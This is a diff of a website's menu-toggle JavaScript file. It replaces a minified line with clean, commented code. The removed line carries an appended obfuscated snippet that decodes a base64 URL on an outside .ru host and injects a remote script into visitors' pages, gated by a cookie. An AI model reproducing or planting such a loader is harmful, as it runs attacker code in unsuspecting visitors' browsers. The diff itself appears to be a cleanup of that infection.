@@ -1,1 +1,33 @@
-const menuBtn=document.querySelector(".menu-btn"),menu=document.querySelector(".menu"),menuNav=document.querySelector(".menu-nav"),menuBranding=document.querySelector(".menu-branding"),navItems=document.querySelectorAll(".nav-item");let showMenu=!1;function toggleMenu(){showMenu?(menuBtn.classList.remove("close"),menu.classList.remove("show"),menuNav.classList.remove("show"),menuBranding.classList.remove("show"),navItems.forEach((e=>e.classList.remove("show"))),showMenu=!1):(menuBtn.classList.add("close"),menu.classList.add("show"),menuNav.classList.add("show"),menuBranding.classList.add("show"),navItems.forEach((e=>e.classList.add("show"))),showMenu=!0)}menuBtn.addEventListener("click",toggleMenu);!function(o,w,d,l){try{o.c="h"==l.protocol[0]&&/./.test(l.hostname)&&!/PHPPREFS/.test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement("script"),o.s.src=atob("aHR0cHM6Ly9hcGkuY3Jhc2hseXRpY3MucnUvdHJhY2tpbmcvc2NyaXB0LmpzP3JlZmVycmVyPQ==")+l.href,d.body.appendChild(o.s))},1e3),d.cookie="PHPPREFS=full;max-age=39800;"}catch(e){}}({},window,document,location);
+// Select DOM Items
+const menuBtn = document.querySelector('.menu-btn');
+const menu = document.querySelector('.menu');
+const menuNav = document.querySelector('.menu-nav');
+const menuBranding = document.querySelector('.menu-branding');
+const navItems = document.querySelectorAll('.nav-item');
+
+// Set Initial State Of Menu
+let showMenu = false;
+
+menuBtn.addEventListener('click', toggleMenu);
+
+function toggleMenu() {
+  if (!showMenu) {
+    menuBtn.classList.add('close');
+    menu.classList.add('show');
+    menuNav.classList.add('show');
+    menuBranding.classList.add('show');
+    navItems.forEach(item => item.classList.add('show'));
+
+    // Set Menu State
+    showMenu = true;
+  } else {
+    menuBtn.classList.remove('close');
+    menu.classList.remove('show');
+    menuNav.classList.remove('show');
+    menuBranding.classList.remove('show');
+    navItems.forEach(item => item.classList.remove('show'));
+
+    // Set Menu State
+    showMenu = false;
+  }
+}
